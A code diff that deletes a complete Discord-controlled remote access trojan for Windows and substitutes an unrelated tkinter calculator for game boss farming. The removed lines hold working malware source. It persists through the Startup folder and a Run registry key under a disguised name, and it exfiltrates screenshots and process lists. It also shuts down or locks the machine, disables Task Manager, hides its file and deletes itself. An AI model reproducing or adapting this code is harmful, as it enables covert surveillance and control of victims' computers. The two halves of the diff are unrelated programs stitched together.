@@ -1,178 +1,163 @@
-import discord
-import os
-import sys
-import subprocess
-import winreg
-import win32api
-import win32con
-import win32gui
-import win32ui
-import psutil
-import pyautogui
-import shutil
-import tempfile
-from discord.ext import commands
-from PIL import ImageGrab
+import tkinter as tk
+from tkinter import messagebox
+from tkinter import ttk
+from tkcalendar import DateEntry
+from datetime import datetime, timedelta
 
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix='!', intents=intents)
+# Tooltip helper
+class CreateToolTip:
+    def __init__(self, widget, text):
+        self.widget = widget
+        self.text = text
+        self.tip_window = None
+        widget.bind("<Enter>", self.show_tip)
+        widget.bind("<Leave>", self.hide_tip)
 
-TOKEN = 'YOUR_BOT_TOKEN_HERE'
+    def show_tip(self, event=None):
+        if self.tip_window or not self.text:
+            return
+        x, y, cx, cy = self.widget.bbox("insert")
+        x += self.widget.winfo_rootx() + 25
+        y += self.widget.winfo_rooty() + 25
+        self.tip_window = tw = tk.Toplevel(self.widget)
+        tw.wm_overrideredirect(True)
+        tw.wm_geometry(f"+{x}+{y}")
+        label = tk.Label(
+            tw,
+            text=self.text,
+            background="#ffffe0",
+            relief="solid",
+            borderwidth=1,
+            font=("tahoma", 9)
+        )
+        label.pack(ipadx=4)
 
-@bot.event
-async def on_ready():
-    print(f'Logged in as {bot.user.name}')
-    await worm_behavior()
+    def hide_tip(self, event=None):
+        tw = self.tip_window
+        if tw:
+            tw.destroy()
+        self.tip_window = None
 
-async def worm_behavior():
-    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    exe_path = sys.executable
-    dest_path = os.path.join(startup_path, 'system_service.exe')
-    
-    if not os.path.exists(dest_path):
-        shutil.copy2(exe_path, dest_path)
-    
+
+def safe_get_float(entry, field_name):
+    """Try to convert entry to float, else show error dialog."""
+    val = entry.get().strip()
+    if val == "":
+        messagebox.showerror("Missing Input", f"Please enter a value for {field_name}.")
+        raise ValueError(f"Missing {field_name}")
     try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, dest_path)
-        winreg.CloseKey(key)
-    except Exception as e:
-        print(f"Registry error: {e}")
+        return float(val)
+    except ValueError:
+        messagebox.showerror("Invalid Input", f"{field_name} must be a number.")
+        raise
 
-@bot.command()
-async def help(ctx):
-    commands_list = [
-        "!help - Show available commands",
-        "!info - Show system information",
-        "!screenshot - Take a screenshot",
-        "!worm - Establish worm persistence",
-        "!processes - List running processes",
-        "!shutdown - Shutdown the computer",
-        "!restart - Restart the computer",
-        "!logoff - Log off the current user",
-        "!lock - Lock the workstation",
-        "!delete - Self-destruct the bot",
-        "!website - Open a website",
-        "!message - Show a message box",
-        "!disable_taskmgr - Disable Task Manager",
-        "!enable_taskmgr - Enable Task Manager",
-        "!hide_file - Hide the bot file"
-    ]
-    await ctx.send("\n".join(commands_list))
 
-@bot.command()
-async def info(ctx):
-    info_msg = (
-        f"Discord Rat Bot - System Info:\n"
-        f"OS: Windows\n"
-        f"Architecture: {os.environ['PROCESSOR_ARCHITECTURE']}\n"
-        f"Bot Version: 1.0"
-    )
-    await ctx.send(info_msg)
-
-@bot.command()
-async def screenshot(ctx):
+def calculate(*args):
     try:
-        screenshot = pyautogui.screenshot()
-        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
-            screenshot.save(temp_file.name)
-            await ctx.send(file=discord.File(temp_file.name))
-        os.unlink(temp_file.name)
-    except Exception as e:
-        await ctx.send(f"Error taking screenshot: {e}")
+        boss_health = safe_get_float(entry_boss_health, "Boss Health per Fight")
+        kill_time = safe_get_float(entry_kill_time, "Kill Time (seconds)")
+        total_relics_needed = safe_get_float(entry_relics_needed, "Total Relics Needed")
+        relics_owned = safe_get_float(entry_relics_owned, "Relics Owned")
+        dmg_per_drop = safe_get_float(entry_dmg_per_drop, "Damage per Relic")
+        uptime = safe_get_float(entry_uptime, "Boss Active Time (min)")
+        downtime = safe_get_float(entry_downtime, "Boss Respawn Time (min)")
 
-@bot.command()
-async def worm(ctx):
-    await worm_behavior()
-    await ctx.send("Worm persistence established.")
+        # Start time
+        date = cal_start.get_date()
+        try:
+            hour = int(spin_hour.get())
+            minute = int(spin_min.get())
+        except ValueError:
+            messagebox.showerror("Invalid Input", "Start time must have valid hour and minute.")
+            return
+        start_time = datetime(date.year, date.month, date.day, hour, minute)
 
-@bot.command()
-async def processes(ctx):
-    process_list = "Running processes:\n"
-    for proc in psutil.process_iter(['name']):
-        process_list += f"{proc.info['name']}\n"
-    await ctx.send(process_list)
+        # Calculate
+        relics_remaining = int(total_relics_needed - relics_owned)
+        total_damage_needed = relics_remaining * dmg_per_drop
+        dps = boss_health / kill_time
 
-@bot.command()
-async def shutdown(ctx):
-    await ctx.send("Shutting down system...")
-    os.system("shutdown /s /t 1")
+        cycle_time = uptime + downtime
+        uptime_seconds = uptime * 60
+        damage_per_cycle = dps * uptime_seconds
+        relics_per_cycle = damage_per_cycle / dmg_per_drop
 
-@bot.command()
-async def restart(ctx):
-    await ctx.send("Restarting system...")
-    os.system("shutdown /r /t 1")
+        cycles_needed = relics_remaining / relics_per_cycle if relics_per_cycle > 0 else 0
+        total_minutes = cycles_needed * cycle_time
+        total_time = timedelta(minutes=total_minutes)
+        end_time = start_time + total_time
 
-@bot.command()
-async def logoff(ctx):
-    await ctx.send("Logging off user...")
-    os.system("shutdown /l")
+        # Update output
+        result_text.set(
+            f"Relics remaining: {relics_remaining}\n"
+            f"Total damage needed: {total_damage_needed:,.0f}\n"
+            f"Approximate real-world time: {total_time}\n\n"
+            f"Estimated end time: {end_time.strftime('%m/%d/%y %H:%M')}\n\n"
+            f"Per Boss Rotation:\n"
+            f"- Damage dealt: {damage_per_cycle:,.0f}\n"
+            f"- Relics gained: {relics_per_cycle:.2f}"
+        )
+    except ValueError:
+        return  # handled by safe_get_float
 
-@bot.command()
-async def lock(ctx):
-    await ctx.send("Locking workstation...")
-    win32api.LockWorkStation()
 
-@bot.command()
-async def delete(ctx):
-    await ctx.send("Self-destruction initiated. Goodbye!")
-    exe_path = sys.executable
-    
-    batch_cmd = f"""@echo off
-timeout /t 2 >nul
-del "{exe_path}"
-del "{exe_path}"
-del "%~f0"
-"""
-    
-    temp_dir = tempfile.gettempdir()
-    batch_path = os.path.join(temp_dir, 'clean.bat')
-    
-    with open(batch_path, 'w') as batch_file:
-        batch_file.write(batch_cmd)
-    
-    subprocess.Popen(batch_path, shell=True)
-    sys.exit(0)
+# GUI setup
+root = tk.Tk()
+root.title("Boss Calculator")
+root.configure(bg="#1e1e1e")
 
-@bot.command()
-async def website(ctx):
-    await ctx.send("Opening website...")
-    subprocess.Popen('start https://www.example.com', shell=True)
+fields = [
+    ("Boss Health per Fight:", "The boss’s total HP in one fight."),
+    ("Kill Time (seconds):", "How many seconds it takes you to kill the boss once."),
+    ("Total Relics Needed:", "Total relics required for your goal."),
+    ("Relics Owned:", "Relics you already have collected."),
+    ("Damage per Relic:", "Damage required to earn 1 relic."),
+    ("Boss Active Time (min):", "How long the boss stays active before despawning."),
+    ("Boss Respawn Time (min):", "Time until the boss respawns after despawning."),
+]
 
-@bot.command()
-async def message(ctx):
-    await ctx.send("Showing message box...")
-    win32api.MessageBox(0, "You've been compromised!", "Warning", win32con.MB_ICONWARNING | win32con.MB_OK)
+entries = []
+for label_text, tip in fields:
+    frame = tk.Frame(root, bg="#1e1e1e")
+    frame.pack(padx=5, pady=5, anchor="w")
+    lbl = tk.Label(frame, text=label_text, fg="white", bg="#1e1e1e")
+    lbl.pack(side="left")
+    entry = tk.Entry(frame, bg="#2d2d2d", fg="white", insertbackground="white")
+    entry.pack(side="left")
+    CreateToolTip(lbl, tip)
+    entries.append(entry)
 
-@bot.command()
-async def disable_taskmgr(ctx):
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
-        winreg.CloseKey(key)
-        await ctx.send("Task Manager disabled.")
-    except Exception as e:
-        await ctx.send(f"Error disabling Task Manager: {e}")
+(entry_boss_health, entry_kill_time, entry_relics_needed,
+ entry_relics_owned, entry_dmg_per_drop, entry_uptime,
+ entry_downtime) = entries
 
-@bot.command()
-async def enable_taskmgr(ctx):
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 0)
-        winreg.CloseKey(key)
-        await ctx.send("Task Manager enabled.")
-    except Exception as e:
-        await ctx.send(f"Error enabling Task Manager: {e}")
+# Start time
+frame_time = tk.Frame(root, bg="#1e1e1e")
+frame_time.pack(padx=5, pady=5, anchor="w")
+lbl_time = tk.Label(frame_time, text="Farming Start Time:", fg="white", bg="#1e1e1e")
+lbl_time.pack(side="left")
 
-@bot.command()
-async def hide_file(ctx):
-    exe_path = sys.executable
-    try:
-        win32api.SetFileAttributes(exe_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
-        await ctx.send("File hidden.")
-    except Exception as e:
-        await ctx.send(f"Error hiding file: {e}")
+cal_start = DateEntry(frame_time, background="darkblue", foreground="white", borderwidth=2)
+cal_start.pack(side="left")
+spin_hour = tk.Spinbox(frame_time, from_=0, to=23, width=3, bg="#2d2d2d", fg="white", insertbackground="white")
+spin_hour.pack(side="left")
+spin_min = tk.Spinbox(frame_time, from_=0, to=59, width=3, bg="#2d2d2d", fg="white", insertbackground="white")
+spin_min.pack(side="left")
 
-if __name__ == "__main__":
-    bot.run(TOKEN)
+CreateToolTip(lbl_time, "When you want your farming session to begin.")
+
+# Result box
+result_text = tk.StringVar()
+result_box = tk.Label(root, textvariable=result_text, fg="white", bg="#2d2d2d",
+                      justify="left", anchor="nw", width=60, height=12,
+                      relief="sunken", padx=5, pady=5, font=("Consolas", 10))
+result_box.pack(padx=10, pady=10, fill="both", expand=True)
+
+# Bind live updates
+for e in entries:
+    e.bind("<KeyRelease>", calculate)
+spin_hour.bind("<KeyRelease>", calculate)
+spin_min.bind("<KeyRelease>", calculate)
+cal_start.bind("<<DateEntrySelected>>", calculate)
+
+root.mainloop()
